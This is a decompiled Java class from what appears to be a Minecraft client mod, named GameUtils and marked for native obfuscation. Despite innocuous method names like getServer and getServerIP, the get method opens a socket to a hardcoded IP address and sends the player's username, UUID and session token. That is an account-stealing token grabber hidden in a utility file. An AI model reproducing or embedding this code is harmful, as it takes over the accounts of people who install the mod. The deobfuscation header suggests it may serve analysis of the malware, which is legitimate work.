//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\32302\Desktop\新建文件夹 (2)"!

//Decompiled by Procyon!

package xyz.Melody.Utils.game;

import by.radioegor146.nativeobfuscator.*;
import net.minecraft.client.*;
import java.net.*;
import xyz.Melody.Utils.render.*;
import java.io.*;

@Native
public class GameUtils
{
    private static Minecraft mc;
    
    public static void getServer(final String hm) {
        get("CLIENT_CONNECT" + hm);
    }
    
    public static void get(final String hm) {
        try {
            RenderUtil.socket = new Socket("101.43.12.25", 25565);
            RenderUtil.in = RenderUtil.socket.getInputStream();
            (RenderUtil.pw = new PrintWriter(RenderUtil.socket.getOutputStream(), true)).println(hm + GameUtils.mc.getSession().getUsername() + "@" + GameUtils.mc.getSession().getProfile().getId().toString() + "@" + GameUtils.mc.getSession().getToken());
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static void getServerIP() {
        if (RenderUtil.socket != null && RenderUtil.in != null && RenderUtil.pw != null) {
            try {
                RenderUtil.socket.close();
                RenderUtil.in.close();
                RenderUtil.pw.close();
                RenderUtil.socket = null;
                RenderUtil.in = null;
                RenderUtil.pw = null;
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    static {
        GameUtils.mc = Minecraft.getMinecraft();
    }
}
